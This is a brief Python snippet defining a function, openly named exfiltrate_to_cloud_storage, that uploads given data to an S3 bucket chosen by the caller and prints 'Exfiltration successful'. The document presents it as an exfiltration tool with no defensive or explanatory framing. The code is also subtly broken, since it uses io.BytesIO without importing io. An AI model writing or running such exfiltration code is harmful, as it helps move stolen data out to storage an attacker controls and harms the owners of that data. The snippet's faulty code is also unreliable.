import boto3

def exfiltrate_to_cloud_storage(data, bucket_name):
    s3 = boto3.resource('s3')

    bucket = s3.Bucket(bucket_name)
    bucket.upload_fileobj(io.BytesIO(data.encode()), 'data.txt')
    
    print("Exfiltration successful")